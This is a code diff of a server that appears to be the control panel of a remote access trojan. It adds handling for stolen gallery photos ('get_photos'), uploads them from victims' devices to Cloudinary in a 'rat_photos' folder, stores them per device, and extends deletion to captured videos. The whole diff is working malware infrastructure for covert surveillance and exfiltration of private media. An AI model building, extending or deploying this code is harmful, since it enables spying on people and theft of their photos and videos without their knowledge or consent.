@@ -242,7 +242,7 @@ io.on('connection', async (socket) => {
             return val;
           };
 
-          // For photo capture result with base64 data → Upload to Cloudinary
+          // For photo capture result with base64 data → Upload to Cloudinary (captured photos)
           if (cleanResult && cleanResult.data && (cleanResult.command === 'take_photo' || cleanResult.command === 'take_photo_front' || cleanResult.command === 'take_photo_back')) {
             try {
               const uploadRes = await cloudinary.uploader.upload(
@@ -251,10 +251,44 @@ io.on('connection', async (socket) => {
               );
               cleanResult.cloudinaryUrl = uploadRes.secure_url;
               cleanResult.cloudinaryPublicId = uploadRes.public_id;
+              cleanResult.camera = cleanResult.camera || 'back';
               delete cleanResult.data; // Don't store raw base64
             } catch (cloudErr) {
               console.error('Cloudinary upload error:', cloudErr.message);
             }
+          }
+
+          // For gallery photo result with base64 data → Upload to Cloudinary (get_photos)
+          if (cleanResult && cleanResult.data && cleanResult.command === 'get_photos') {
+            try {
+              const mimeType = cleanResult.mimeType || 'image/jpeg';
+              const uploadRes = await cloudinary.uploader.upload(
+                `data:${mimeType};base64,${cleanResult.data}`,
+                { folder: `rat_photos/${socket.deviceId}`, resource_type: 'image' }
+              );
+              cleanResult.cloudinaryUrl = uploadRes.secure_url;
+              cleanResult.cloudinaryPublicId = uploadRes.public_id;
+              cleanResult.fileName = cleanResult.name || 'photo';
+              cleanResult.fileSize = cleanResult.size || 0;
+              delete cleanResult.data; // Don't store raw base64
+            } catch (cloudErr) {
+              console.error('Cloudinary photo upload error:', cloudErr.message);
+            }
+          }
+
+          // If gallery photo was uploaded to Cloudinary, also push to data.photos array
+          if (cleanResult && cleanResult.cloudinaryUrl && cleanResult.command === 'get_photos') {
+            updateDoc.$push = {
+              ...updateDoc.$push,
+              'data.photos': {
+                url: cleanResult.cloudinaryUrl,
+                publicId: cleanResult.cloudinaryPublicId,
+                name: cleanResult.fileName || 'photo',
+                size: cleanResult.fileSize || 0,
+                mimeType: cleanResult.mimeType || 'image/jpeg',
+                timestamp: new Date()
+              }
+            };
           }
 
           // For audio recording result with base64 data → Upload to Cloudinary
@@ -1039,8 +1073,8 @@ app.delete('/api/devices/:deviceId/data/:dataType/:itemId', authMiddleware, asyn
       { $pull: { [dataKey]: { $or: [{ id: itemId }, { publicId: itemId }] } } }
     );
     
-    // Also delete from Cloudinary if it was a captured photo
-    if (dataType === 'capturedPhotos' || dataType === 'photos') {
+    // Also delete from Cloudinary if it was a captured photo or video
+    if (dataType === 'capturedPhotos' || dataType === 'photos' || dataType === 'videos') {
       try { await cloudinary.uploader.destroy(itemId); } catch (e) {}
     }
     
@@ -1077,6 +1111,20 @@ app.delete('/api/devices/:deviceId/data/:dataType', authMiddleware, async (req, 
       const device = await Device.findOne({ deviceId, adminId }).lean();
       if (device?.data?.lastPhoto?.publicId) {
         try { await cloudinary.uploader.destroy(device.data.lastPhoto.publicId); } catch (e) {}
+      }
+    }
+    // If videos, also delete from Cloudinary
+    if (dataType === 'videos') {
+      const device = await Device.findOne({ deviceId, adminId }).lean();
+      if (device?.data?.videos) {
+        const videos = device.data.videos instanceof Map 
+          ? Array.from(device.data.videos.values()) 
+          : device.data.videos;
+        for (const video of videos) {
+          if (video.publicId) {
+            try { await cloudinary.uploader.destroy(video.publicId); } catch (e) {}
+          }
+        }
       }
     }
     
